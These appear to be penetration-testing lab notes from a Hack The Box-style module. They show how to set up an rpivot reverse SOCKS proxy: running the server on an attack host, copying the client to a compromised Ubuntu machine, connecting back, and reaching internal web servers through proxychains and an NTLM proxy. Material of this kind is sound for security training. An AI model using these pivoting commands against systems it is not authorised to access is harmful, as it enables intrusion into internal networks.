#### Cloning rpivot
  Cloning rpivot
```shell-session
Tachipy@htb[/htb]$ sudo git clone https://github.com/klsecservices/rpivot.git
```
#### Installing Python2.7
  Installing Python2.7
```shell-session
Tachipy@htb[/htb]$ sudo apt-get install python2.7
```
We can start our rpivot SOCKS proxy server to connect to our client on the compromised Ubuntu server using `server.py`.

#### Running server.py from the Attack Host
  Running server.py from the Attack Host
```shell-session
Tachipy@htb[/htb]$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```
#### Transfering rpivot to the Target
  Transfering rpivot to the Target
```shell-session
Tachipy@htb[/htb]$ scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```
#### Running client.py from Pivot Target
  Running client.py from Pivot Target
```shell-session
ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.14.253 --server-port 9999

Backconnecting to server 10.10.14.18 port 9999
```
#### Browsing to the Target Webserver using Proxychains
```shell-session
proxychains firefox-esr 172.16.5.135:80
```
#### Connecting to a Web Server using HTTP-Proxy & NTLM Auth
```shell-session
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```